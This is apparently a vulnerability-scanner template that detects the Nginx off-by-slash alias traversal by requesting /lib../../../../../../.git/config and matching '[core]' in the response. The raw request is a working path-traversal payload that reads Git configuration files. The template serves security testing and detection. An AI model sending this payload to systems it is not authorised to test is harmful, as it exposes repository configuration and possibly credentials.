id: git-config-nginxoffbyslash9
info:
  author: organiccrap
  description: Nginx off-by-slash vulnerability exposes Git configuration.
  name: Nginx off-by-slash exposes Git config
  reference: '- https://twitter.com/Random_Robbie/status/1262676628167110656

    - https://github.com/PortSwigger/nginx-alias-traversal/blob/master/off-by-slash.py

    '
  severity: medium
  tags: config,exposure
requests:
- matchers:
  - type: word
    words:
    - '[core]'
  raw:
  - 'GET /lib../../../../../../.git/config HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101
    Firefox/55

    '
